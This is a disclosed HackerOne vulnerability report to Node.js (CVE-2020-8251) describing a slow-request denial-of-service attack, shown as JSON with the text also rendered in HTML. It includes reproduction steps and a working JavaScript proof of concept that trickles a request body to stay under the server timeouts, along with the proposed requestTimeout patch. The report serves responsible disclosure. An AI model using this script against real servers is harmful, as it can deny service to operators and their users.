{"id":868834,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Njg4MzQ=","url":"https://hackerone.com/reports/868834","title":"Denial of Service by resource exhaustion CWE-400 due to unfinished HTTP/1.1 requests","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-05-08T07:45:07.938Z","submitted_at":"2020-05-08T07:45:07.938Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"shogunpanda","url":"/shogunpanda","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/sYGTTtbcoioPBBRUUH3s1cLY/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22984,"url":"https://hackerone.com/nodejs","handle":"nodejs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js","twitter_handle":"nodejs","website":"https://nodejs.org","about":"The Node.js JavaScript Runtime"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8251"],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-17T19:24:45.481Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-09-17T19:24:31.171Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** Node.js is vulnerable to HTTP denial of service (DOS) attacks based on delayed requests submission which can make the server unable to accept new connections.\n\n**Description:**\n\nAn attacker can open an arbitrary number of HTTP connections and keep the server busy by never completing the request phase.\n\nNode.js only has two requests timeouts:\n\n1. [server.timeout](https://nodejs.org/docs/latest-v12.x/api/http.html#http_server_timeout) that controls the maximum number of milliseconds the socket can be idle. This also includes the server processing time. \n2. [server.headersTimeout](https://nodejs.org/docs/latest-v13.x/api/http.html#http_server_headerstimeout) (Added in Node 11.3.0), that controls the maximum number of milliseconds allowed to receive the full request headers before timing out.\n\nHandling of request bodies is specific to the application code and core Node.js never consumes or parses the request bodies. \n\nCurrently, the body parsing and handling is performed by the following modules:\n* [fastify](https://www.fastify.io/)\n* [restify](https://restify.com/)\n* [busboy](https://github.com/mscdex/busboy), used by [fastify-multpart](https://github.com/fastify/fastify-multipart/) and [multer](https://github.com/expressjs/multer)\n* [raw-body](https://github.com/stream-utils/raw-body), used by [body-parser](https://github.com/expressjs/body-parser)\n\nAll of the modules above are vulnerable to the attack.\n\nIf part of the body is already sent, the body parsing modules above can be patched to impose a request body sending timeout and therefore mitigate the attack.\n\nThe application unfortunately can not completely handle this attack. If the attacker never starts sending the body after completing the submission of the headers, the application code is never invoked. \n\nPrior to Node.js 13.0.0, the default timeout for a request was 2 minutes, which is a countermeasure against this attack.\nStarting with Node.js 13.0.0 instead, the default timeout has been changed to be 0 (which means no timeout) in order to address serverless deployments where long running requests are needed. Since the socket is never considered idle, the application is completely vulnerable to the attack.\n\nWhile `server.headersTimeout` is able to detect a slow request, it is only effective if the delay happens during the headers phase (like in Slowloris attacks). If the attacker delays the start of the headers, the start of body sending or sends the body very slow without resulting in an idle socket, the attack is not detected.\n\nIn the long run an unprotected server will have a lot of pending requests to handle. At some point it will reach the open connections limit and therefore will not be able to serve additional requests, resulting in a Denial of Service.\n\n## Steps To Reproduce:\n\n1. From one or more attacking sources, open one or more HTTP connections to the target server\n2. For each of the connection in step 1\n     2.1. (Optional) Wait a certain amount of time before sending the first request header.\n     2.2 Send all request headers with regular pausing.\n     2.3 (Optional) Wait a certain amount of time before sending the body data.\n     2.4. Send the request body with regular pausing.\n\nAll the substeps must be performed by sending periodically the smallest amount of data with the highest delay such that the server does not detect an idle socket. For Node 13.0.0 and above there is no idle timeout by default, so the attacker can wait an arbitrary time. For Node.js prior to 13.0.0, at least one byte each 2 minutes must be sent.\n\nWe have tested the following test cases:\n\n1. **Connection established, none or partial headers sent then sending is paused:** If `server.timeout` is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.\n2. **Connection established, headers sent with long delays:** `server.headersTimeout` is triggered and closes the connection with no response. \n3. **Connection established, headers sent and sending is paused before starting the body:** If `server.timeout` is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.\n4. **Connection established, headers sent, body sent with long delays:** `server.timeout` is not able to detect the attack and the server is completely vulnerable to the attack.\n\nWhat follows is a sample code which reproduces the problem. \n\n```javascript\nconst { createConnection } = require('net')\n\nlet start\nlet response = ''\nlet body = ''.padEnd(4096, '123')\n\nconst client = createConnection({ port: parseInt(process.argv[2], 10) }, () =\u003e {\n  start = process.hrtime.bigint()\n\n  // Send all the headers quickly so that server.headersTimeout is not triggered\n  client.write('POST / HTTP/1.1\\r\\n')\n  client.write('Content-Type: text/plain\\r\\n')\n  client.write(`Content-Length: ${Buffer.byteLength(body)}\\r\\n`)\n  client.write(`\\r\\n`)\n\n  // Send the body very slower but in away that the server.timeout is not triggered\n  let i = 0\n  let interval = setInterval(() =\u003e {\n    client.write(body[i])\n    i++\n\n    // Done sending, end the request\n    if (i === body.length) {\n      clearInterval(interval)\n      client.write(`\\r\\n\\r\\n`)\n    }\n  }, 60000)\n})\n\nclient.on('data', data =\u003e {\n  response += data\n  client.end()\n})\n\nclient.on('close', () =\u003e {\n  const duration = Number(process.hrtime.bigint() - start) / 1e9\n\n  console.log(`Receive the following response (${response.length} bytes) in ${duration.toFixed(3)} s:\\n\\n`)\n  console.log(response)\n})\n```\n\nOnce executed, the client will not receive a response before 4096 minutes. If multiple parallel execution of the code above targets the same server, it will result in service denial. \n\n## Impact\n\nThis attack has very low complexity and can easily trigger a DDOS on an unprotected server.\n\n## Supporting Material/References:\n\nWe have written a patch for Node.js ([PR 33304](https://github.com/nodejs/node/pull/33304)) which introduces a new `http.Server` option called `requestTimeout` with a default value in milliseconds of `120000` (2 minutes).\n\nWhen `requestTimeout` is a positive value, the server will start a new timer set to expire in `requestTimeout` milliseconds when a new connection is established. The timer is also set again if new requests after the first are received on the socket (this handles pipelining and keep-alive cases).\nThe timer is cancelled in the following case:\n\n1. When the request body is completely received by the server.\n2. When the response is completed. This handles the case where the application responds to the client without consuming the request body.\n3. When the connection is upgraded, like in the WebSocket case.\n\nIf the timer expires, then the server responds with status code 408 and closes the connection. This prevents the DOS attack.\n\n## Acknowledgement\n\nThis research was conducted and co-authored by me and [Matteo Collina](matteo.collina@nearform.com) and has been sponsored by [NearForm](https://nearform.com)\n\n## Impact\n\nIf an attacker execute a significative amount of requests on a target server without completing any, the server at some point will reach the allowed number of open connections and will not be able to serve any further request, resulting in a Denial of Service.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e Node.js is vulnerable to HTTP denial of service (DOS) attacks based on delayed requests submission which can make the server unable to accept new connections.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eAn attacker can open an arbitrary number of HTTP connections and keep the server busy by never completing the request phase.\u003c/p\u003e\n\n\u003cp\u003eNode.js only has two requests timeouts:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fdocs%2Flatest-v12.x%2Fapi%2Fhttp.html%23http_server_timeout\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eserver.timeout\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that controls the maximum number of milliseconds the socket can be idle. This also includes the server processing time. \u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fnodejs.org%2Fdocs%2Flatest-v13.x%2Fapi%2Fhttp.html%23http_server_headerstimeout\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eserver.headersTimeout\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (Added in Node 11.3.0), that controls the maximum number of milliseconds allowed to receive the full request headers before timing out.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eHandling of request bodies is specific to the application code and core Node.js never consumes or parses the request bodies. \u003c/p\u003e\n\n\u003cp\u003eCurrently, the body parsing and handling is performed by the following modules:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fwww.fastify.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efastify\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Frestify.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003erestify\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmscdex%2Fbusboy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ebusboy\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, used by \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffastify%2Ffastify-multipart%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003efastify-multpart\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fexpressjs%2Fmulter\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003emulter\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fstream-utils%2Fraw-body\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eraw-body\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, used by \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fexpressjs%2Fbody-parser\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ebody-parser\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAll of the modules above are vulnerable to the attack.\u003c/p\u003e\n\n\u003cp\u003eIf part of the body is already sent, the body parsing modules above can be patched to impose a request body sending timeout and therefore mitigate the attack.\u003c/p\u003e\n\n\u003cp\u003eThe application unfortunately can not completely handle this attack. If the attacker never starts sending the body after completing the submission of the headers, the application code is never invoked. \u003c/p\u003e\n\n\u003cp\u003ePrior to Node.js 13.0.0, the default timeout for a request was 2 minutes, which is a countermeasure against this attack.\u003cbr\u003e\nStarting with Node.js 13.0.0 instead, the default timeout has been changed to be 0 (which means no timeout) in order to address serverless deployments where long running requests are needed. Since the socket is never considered idle, the application is completely vulnerable to the attack.\u003c/p\u003e\n\n\u003cp\u003eWhile \u003ccode\u003eserver.headersTimeout\u003c/code\u003e is able to detect a slow request, it is only effective if the delay happens during the headers phase (like in Slowloris attacks). If the attacker delays the start of the headers, the start of body sending or sends the body very slow without resulting in an idle socket, the attack is not detected.\u003c/p\u003e\n\n\u003cp\u003eIn the long run an unprotected server will have a lot of pending requests to handle. At some point it will reach the open connections limit and therefore will not be able to serve additional requests, resulting in a Denial of Service.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eFrom one or more attacking sources, open one or more HTTP connections to the target server\u003c/li\u003e\n\u003cli\u003eFor each of the connection in step 1\n 2.1. (Optional) Wait a certain amount of time before sending the first request header.\n 2.2 Send all request headers with regular pausing.\n 2.3 (Optional) Wait a certain amount of time before sending the body data.\n 2.4. Send the request body with regular pausing.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eAll the substeps must be performed by sending periodically the smallest amount of data with the highest delay such that the server does not detect an idle socket. For Node 13.0.0 and above there is no idle timeout by default, so the attacker can wait an arbitrary time. For Node.js prior to 13.0.0, at least one byte each 2 minutes must be sent.\u003c/p\u003e\n\n\u003cp\u003eWe have tested the following test cases:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cstrong\u003eConnection established, none or partial headers sent then sending is paused:\u003c/strong\u003e If \u003ccode\u003eserver.timeout\u003c/code\u003e is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003eConnection established, headers sent with long delays:\u003c/strong\u003e \u003ccode\u003eserver.headersTimeout\u003c/code\u003e is triggered and closes the connection with no response. \u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003eConnection established, headers sent and sending is paused before starting the body:\u003c/strong\u003e If \u003ccode\u003eserver.timeout\u003c/code\u003e is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003eConnection established, headers sent, body sent with long delays:\u003c/strong\u003e \u003ccode\u003eserver.timeout\u003c/code\u003e is not able to detect the attack and the server is completely vulnerable to the attack.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eWhat follows is a sample code which reproduces the problem. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"nx\"\u003ecreateConnection\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enet\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003estart\u003c/span\u003e\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ebody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epadEnd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e4096\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e123\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ecreateConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e \u003cspan class=\"na\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nb\"\u003eparseInt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003estart\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehrtime\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebigint\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// Send all the headers quickly so that server.headersTimeout is not triggered\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ePOST / HTTP/1.1\u003c/span\u003e\u003cspan class=\"se\"\u003e\\r\\n\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eContent-Type: text/plain\u003c/span\u003e\u003cspan class=\"se\"\u003e\\r\\n\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Content-Length: \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eBuffer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebyteLength\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\\r\\n`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\\r\\n`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n  \u003cspan class=\"c1\"\u003e// Send the body very slower but in away that the server.timeout is not triggered\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003einterval\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003esetInterval\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\n\n    \u003cspan class=\"c1\"\u003e// Done sending, end the request\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eclearInterval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003einterval\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`\\r\\n\\r\\n`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"mi\"\u003e60000\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003edata\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nx\"\u003edata\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eend\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003eclient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eclose\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003eduration\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eNumber\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehrtime\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebigint\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nx\"\u003estart\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"nx\"\u003ee9\u003c/span\u003e\n\n  \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e`Receive the following response (\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e bytes) in \u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eduration\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etoFixed\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e s:\\n\\n`\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOnce executed, the client will not receive a response before 4096 minutes. If multiple parallel execution of the code above targets the same server, it will result in service denial. \u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis attack has very low complexity and can easily trigger a DDOS on an unprotected server.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eWe have written a patch for Node.js (\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnodejs%2Fnode%2Fpull%2F33304\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePR 33304\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) which introduces a new \u003ccode\u003ehttp.Server\u003c/code\u003e option called \u003ccode\u003erequestTimeout\u003c/code\u003e with a default value in milliseconds of \u003ccode\u003e120000\u003c/code\u003e (2 minutes).\u003c/p\u003e\n\n\u003cp\u003eWhen \u003ccode\u003erequestTimeout\u003c/code\u003e is a positive value, the server will start a new timer set to expire in \u003ccode\u003erequestTimeout\u003c/code\u003e milliseconds when a new connection is established. The timer is also set again if new requests after the first are received on the socket (this handles pipelining and keep-alive cases).\u003cbr\u003e\nThe timer is cancelled in the following case:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWhen the request body is completely received by the server.\u003c/li\u003e\n\u003cli\u003eWhen the response is completed. This handles the case where the application responds to the client without consuming the request body.\u003c/li\u003e\n\u003cli\u003eWhen the connection is upgraded, like in the WebSocket case.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eIf the timer expires, then the server responds with status code 408 and closes the connection. This prevents the DOS attack.\u003c/p\u003e\n\n\u003ch2 